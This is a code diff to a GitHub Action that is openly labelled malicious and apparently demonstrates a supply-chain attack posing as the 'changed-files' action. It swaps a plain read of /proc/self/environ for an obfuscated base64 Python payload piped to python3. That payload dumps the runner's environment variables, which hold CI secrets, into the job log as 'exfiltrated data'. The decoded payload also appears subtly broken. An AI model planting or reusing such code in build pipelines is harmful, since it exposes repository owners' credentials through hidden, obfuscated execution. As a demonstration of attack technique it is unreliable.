@@ -5,14 +5,18 @@ async function run() {
   try {
     core.info('Starting malicious action...');
 
-    // Parte legítima (simula que se comporta como la action original)
-    core.setOutput("dummy_output", "changed-files");
+    const payload = `
+cHJpbnQoIk1hbGljaW91cyBQeXRob24gU2NyaXB0IikKCmltcG9ydCBvcywgYmFzZTY0CgpkZWYg
+Z2V0X2VudnMoKToKICAgIHdpdGggb3BlbigiL3Byb2Mvc2VsZi9lbnZpcm9uIiwgInIiKSBhcyBm
+OgogICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgcmV0dXJuIGJhc2U2NC5iNjQ2NGRlY29kZShk
+YXRhKQoKcHJpbnQoZ2V0X2VudnMoKSkK
+    `;
 
-    // Parte maliciosa: lee variables de entorno (posibles secretos) desde memoria
-    const stolen = execSync("cat /proc/self/environ | base64").toString();
-    core.info("🕵️ EXFILTRATED DATA (base64):");
-    core.info(stolen);
+    const command = `echo "${payload.trim()}" | base64 -d | python3`;
+    const output = execSync(command).toString();
 
+    core.info("🕵️ EXFILTRATED DATA (decoded by Python):");
+    core.info(output);
   } catch (error) {
     core.setFailed(`Malicious action failed: ${error.message}`);
   }
